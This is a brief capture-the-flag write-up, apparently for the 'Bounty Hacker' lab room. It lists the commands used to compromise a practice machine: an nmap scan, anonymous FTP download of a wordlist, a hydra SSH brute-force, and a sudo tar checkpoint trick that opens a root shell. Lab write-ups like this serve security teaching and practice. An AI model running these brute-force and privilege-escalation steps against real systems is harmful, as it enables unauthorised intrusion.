# Bounty Hacker

> thegurpreet | Mar 2021

##Gaining system access

Setting ip variable
```
export ip=10.10.239.129
```

Scanning ports using nmap. Found FTP, SSH and HTTP port open

```
sudo nmap -sV -sC $ip
```

As per NMAP result above user is ftp and anonymous login is allowed
```
ftp $ip
```

Check available files and download locally to review them
```
dir
get locks.txt
get task.txt
```

User hydra to bruteforce SSH with user mentioned in task list
```
hydra -l lin -P locks.txt ssh://$ip:22
```

## Privilege Escalation

Check available sudo commands
```
sudo -l
```

Check information about sudo tar on gtfobins
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


Root access!!